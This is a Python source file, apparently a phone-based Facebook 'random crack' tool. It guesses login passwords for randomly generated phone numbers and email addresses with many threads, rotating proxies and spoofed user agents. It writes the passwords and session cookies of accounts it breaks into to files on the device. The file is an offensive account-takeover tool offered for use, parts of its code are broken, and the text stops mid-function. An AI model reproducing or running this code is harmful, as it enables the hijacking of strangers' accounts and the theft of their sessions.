import os
import time
try:os.mkdir('/sdcard/JARV1S')
except:pass
os.system('clear')
print('\n\033[1;92m connecting....')
time.sleep(0.8)
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('clear')
print('\n\033[1;97m checking module..!')
time.sleep(0.5)
try:
	import requests
except ImportError:
	print('\n [\033[1;91mX\033[1;97m] module is not installed correctly!...\n')
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
else:
	print('\n[\033[1;92m✓\033[1;97m] module was installed correctly')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m' 
os.system("git pull")
ugen=[]
redmi=[]
jrvis=[]

	
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
	
for agent in range(10000):
		aa='Mozilla/5.0 (Linux; Android 6.0.1;'
		b=random.choice(['6','7','8','9','10','11','12'])
		c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
		d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
		e=random.randrange(1, 999)
		f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
		g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
		h=random.randrange(73,100)
		i='0'
		j=random.randrange(4200,4900)
		k=random.randrange(40,150)
		l='Mobile Safari/533.1'
		fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
		ugen.append(fullagnt)


for xd in range(20000):
	rr = random.randint; rc = random.choice
	gt = ['N9LEFH','TQ3A','QQ0B','PQ4A','SQ3A','RD1B','LDK5WU','SD2A','AB73E','Z367Q','R8938','C886H','GT-P5100|IML74K','SM-J320F|LMY47V','GT-N8000|JZO54K'] 
	strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(samsung))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
	uateddy = random.choice([strvgt])
	jrvis.append(uateddy)

ug ='viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .5; WOW64)QQ1B)Applewebkit/537.36 (KHTML, like Gecko) Chrome/89.0.4478.76 Safari/537.36 Vivaldi/6.0.2979.18', 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .10; WOW64)AB03E)Applewebkit/537.36 (KHTML, like Gecko) Chrome/94.0.4947.42 Safari/537.36 Vivaldi/6.0.2979.18', 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .8; WOW64)QQ1B)Applewebkit/537.36 (KHTML, like Gecko) Chrome/89.0.4578.137 Safari/537.36 Vivaldi/6.0.2979.18', 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .15; WOW64)LDK2WU)Applewebkit/537.36 (KHTML, like Gecko) Chrome/123.0.4609.47 Safari/537.36 Vivaldi/6.0.2979.18', 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .9; WOW64)QQ1B)Applewebkit/537.36 (KHTML, like Gecko) Chrome/65.0.4343.132 Safari/537.36 Vivaldi/6.0.2979.18'
ua2 = 'Dalvik/2.1.0 (Linux; U; Android 11; KFAUWI Build/QP1A.256711.839) [FBAN/Orca-Android;FBAV/266.0.0.16.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/216901621;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]'
jrvis =['FBAN/FB4A;FBAV/282.0.0.576;FBBV/3552100;[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809011;FBDM/{density=3.0,width=1080,height=2050};FBLC/en_GB;FBRV/310262918;FBCR/Beeline;FBMF/meizu;FBBD/meizu;FBPN/com.facebook.katana;FBDV/meizu note9/DS;FBSV/9.0.0;FBOP/1;FBCA/arm64-v8a:;']
syed =[
'Davik/2.1.0 (Linux; U; Android 11; M2004J19C Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/313.0.0.135;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/443961951;FBCR/JIO 4G;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2004J19C;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};']
logo = ("""
	\033[1;97m
  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[MAINAK-XD] \x1b[1;91m——————                		
\033[1;37;1m———————————————————————————————————————————————""")
loop = 0
oks = []
cps = []


def menu():
	os.system('clear')
	print(logo)
	print('[1] Start Random Crack')
	print('[0] Exit')
	print(47*"—") 
	opt = input('[?] Choose : ')
	if opt =='1':
		method1()
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()
		
def method():
	os.system('clear')
	print(logo)
	print('[1] IND CLONING  [\x1b[1;92mBEST\x1b[1;97m] ')
	print('[2] PAK CLONING  [\x1b[1;91mTRY\x1b[1;97m] ')
	print('[3] MAIL CLONING [\x1b[1;92mBEST\x1b[1;97m] ')
	print('[0] Back')
	print(47*"—") 
	opt = input('[?] Choose : ')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='3':
		method3()
	elif opt =='0':
		menu()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()
def check_frnds(coki):
	#print(coki)
	try:
		a = requests.get('https://mbasic.facebook.com/profile.php?v=friends',cookies={'cookie':coki}).text.replace("amp;","")
	except:
		pass
	try:
		ttl = re.findall(">Friends (.*?)<",a)[0].replace('(','').replace(')','')
		return (str(f"{str(ttl)}"))
	except:
		return 'Err00r'

#def cek_apk(session,coki):
	#w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	#sop = BeautifulSoup(w,"html.parser")
	#x = sop.find("form",method="post")
	#game = [i.text for i in x.find_all("h3")]
	#if len(game)==0:
		#print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s '%(N,M,N,M,N))
	#else:
		#print(f'\r %sYour Active Application Details :'%(H))
		#for i in range(len(game)):
			#print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

def method1():
	user=[]
	os.system('clear');print(logo)
	print('[+] Use Six Digit Code (974532,983267)')
	print(47*"—") 
	kode = input('[?] Input Code : ')
	print(47*"—") 
	limit = int(input('[?] How Many Numbers Do You Want To Add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl+' \x1b[1;97m>\x1b[1;91m>\x1b[1;97m>\x1b[1;97m Choice Code: '+kode)
		print(47*"\x1b[1;97m—") 
		for guru in user:
			uid = kode+guru
			pwx = [kode,kode+guru,guru,'57273200','57575751']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	menu()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global jrvis
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM\x1b[1;97m]  \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m | \x1b[38;5;208m%s\x1b[1;97m \r'%(loop,len(oks),len(cps))),
			sys.stdout.flush()
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			en = random.choice(['en_US','en_GB'])
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Jio','Airtel','null','Marshmallow','Telekom China']) 
			xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/Hwawie;"+"FBBD/Opppo;"+"FBPN/com.facebook.katana;"+"FBDV/Samsong 17974;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:arfuck-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/relmeo;"+"FBBD/technO;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
			#ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.82,width=1605,height=633};FBLC/es_ES;FBRV/'+fbrv+';FBCR/459657077;FBMF/Honor;FBBD/Android;FBPN/com.facebook.katana;FBDV/Device-9601;FBSV/'+fbsv+';FBOP/19;FBCA/armeabi-v8a;]"
			#ua = random.choice(jrvis)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"next":"https://p.facebook.com/login/device-based/regular/login/?refsrc",
			"flow":"login_no_pin",
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'mbasic.facebook.com',
			'upgrade-insecure-requests': '1',
			"viewport-width": f"str(rr(400,989)",
			'origin': 'https://mbasic.facebook.com',
			'referer': 'https://m.facebook.com/', 
			'method': 'GET',
			'path': '/login/?ref=dbl&fl&login_from_aymh=1&rtime=1703422129&hrc=1&wtsid=rdr_0jlfylwfWkGmNLiyI&refsrc=deprecated&_rdr',
			"content-type": "application/x-www-form-urlencoded",
			'cache-control': 'max-age=0',
			'accept': '*/*',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'empty',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
			'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
			"sec-ch-prefers-color-scheme": "light",
			'user-agent': ua};lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb,proxies=proxs).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cooki = f"sb={ssbb};{coki}"
				cid = coki[151:166]
				#uid = str(po['cid'])
				print('\033[1;92m[JARVIS-OK] '+cid+' | '+ps+'\033[1;32m')
				#print('\033[1;97m[COOKIES]' '\033[1;97m' +coki)
				#cek_apk(session,coki)
				open('/sdcard/JARV1S/jrvis-cookies.txt', 'a').write(cid+'|'+ps+'|'+cooki+'\n')
				oks.append(cid) 
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				#print('\033[1;91m[Checkpoint] '+cid+' | '+ps+'\033[1;32m')
				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method2 ():
	user=[]
	os.system('clear');print(logo)
	print('[+] Use ind Sim Code (876837,976737)')
	print(47*"—") 
	kode = input('[?] Input Code : ')
	print(47*"—") 
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl+' \x1b[1;97m>\x1b[1;91m>\x1b[1;97m>\x1b[1;93m>\x1b[1;97m Choice Code: '+kode)
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;96m Use Flight Mode If Idz Not Coming');print(47*"\x1b[1;97m—") 
		print('')
		for guru in user:
			uid = kode+guru
			pwx = [kode,kode+guru,'59039200','57273200']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def fcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global jrvis
	url = "m.facebook.com"
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r \033[1;97m[MAINAK-XD] %s |OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
			head = {"authority": url,
			"content-length": f"{len(str(date))}",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua2,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "mark.via.gp",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://"+url,
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "zh-CN;q=0.8,zh;q=0.9",
			"x-response-format": "JSONStream"}
			#po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False)
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[OK] '+cid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print(coki)
				open('/sdcard/jrvis.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\033[1;91m[CP] '+cid+' | '+ps+'\033[1;32m')
				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method3():
	user=[]
	os.system('clear');print(logo)
	print('[+] Type Any Name Of Your Country !')
	print(47*"—") 
	kode = input('[?] Input Name: ')
	print(47*"—") 
	print('[+] Some Domain : @gmail.com , @yahoo.com ')
	print(47*"—") 
	domain = input('[?] Input Domain: ')
	print(47*"—") 
	limit = int(input('[?] How many account do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl)
		print(47*"\x1b[1;97m—") 
		print('')
		for guru in user:
			uid = kode+guru+domain
			pwx = [kode,kode+'@123',kode+'123',kode+'1234','57273200',kode+guru]
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global ugen
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r \033[1;97m[MAINAK-XD] [%s]>>OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="([^"]+)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'm.facebook.com',
			'method': 'GET',
			'scheme': 'https',
			'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
			'sec-ch-ua-mobile': '?1',
